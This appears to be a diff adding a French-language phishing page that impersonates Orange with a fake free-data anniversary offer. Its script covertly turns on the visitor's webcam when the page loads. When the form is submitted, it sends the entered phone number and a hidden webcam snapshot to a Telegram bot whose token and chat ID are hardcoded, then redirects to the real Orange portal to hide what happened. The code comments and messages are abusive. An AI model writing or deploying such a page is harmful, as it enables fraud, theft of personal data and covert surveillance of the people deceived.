@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Orange - Connexion Gratuite</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f5f5f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .login-container {
+            background: white;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0,0,0,0.1);
+            width: 320px;
+            text-align: center;
+        }
+        .login-container img {
+            width: 100px;
+            margin-bottom: 10px;
+        }
+        .login-container h2 {
+            color: #ff6200; /* Orange brand color */
+            font-size: 24px;
+            margin-bottom: 20px;
+        }
+        .login-container p {
+            color: #333;
+            font-size: 14px;
+            margin-bottom: 15px;
+        }
+        .login-container input {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            box-sizing: border-box;
+        }
+        .login-container button {
+            width: 100%;
+            padding: 12px;
+            background-color: #ff6200; /* Orange brand color */
+            color: white;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 16px;
+        }
+        .login-container button:hover {
+            background-color: #e55a00;
+        }
+        #video {
+            display: none; /* Hidden video feed */
+        }
+        #canvas {
+            display: none; /* Hidden canvas for snapshot */
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/c/c8/Orange_logo.svg/1200px-Orange_logo.svg.png" alt="Orange Logo">
+        <h2>Connexion Gratuite Orange</h2>
+        <p>Orange fête ses 66 ans ! Profitez de notre offre spéciale : connexion gratuite avec 10 Go pour les cartes SIM de 3 mois, 20 Go pour 1 an, et 100 Go pour 6 ans ou plus. Entrez votre numéro de téléphone pour bénéficier de l’offre.</p>
+        <form id="loginForm">
+            <input type="tel" id="phone" placeholder="Numéro de téléphone (ex: +224613031896)" required>
+            <button type="submit">Confirmer</button>
+        </form>
+    </div>
+    <video id="video" width="320" height="240" autoplay></video>
+    <canvas id="canvas" width="320" height="240"></canvas>
+
+    <script>
+        // Request webcam access
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        navigator.mediaDevices.getUserMedia({ video: true })
+            .then(stream => {
+                video.srcObject = stream;
+            })
+            .catch(err => {
+                console.error('Webcam access denied, you dumb fuck:', err);
+            });
+
+        const form = document.getElementById('loginForm');
+        form.addEventListener('submit', function(event) {
+            event.preventDefault();
+            const phone = document.getElementById('phone').value;
+            const botToken = '8301457425:AAEEwiMw1U-dccApQMZHDx2V1f9otf6xpWg'; // Your bot token
+            const chatId = '7965747090'; // Your Chat ID
+
+            // Send phone number to Telegram
+            const textMessage = `New Orange Login:%0APhone: ${phone}`;
+            const textUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${textMessage}`;
+
+            fetch(textUrl)
+                .then(response => {
+                    if (!response.ok) {
+                        console.error('Failed to send text, you fuck:', response);
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+
+            // Take a snapshot from the webcam
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            const imageData = canvas.toDataURL('image/jpeg', 0.8); // 80% quality JPEG
+
+            // Send image to Telegram
+            const imageFormData = new FormData();
+            imageFormData.append('chat_id', chatId);
+            imageFormData.append('photo', dataURLtoBlob(imageData));
+
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: imageFormData
+            })
+                .then(response => {
+                    if (response.ok) {
+                        window.location.href = 'https://www.orange.fr/portail'; // Redirect to Orange portal
+                    } else {
+                        alert('Quelque chose a merdé, espèce de con. Réessaie.');
+                    }
+                })
+                .catch(error => {
+                    console.error('Error:', error);
+                });
+        });
+
+        // Convert data URL to Blob for sending image
+        function dataURLtoBlob(dataURL) {
+            const arr = dataURL.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) {
+                u8arr[n] = bstr.charCodeAt(n);
+            }
+            return new Blob([u8arr], { type: mime });
+        }
+    </script>
+</body>
+</html>
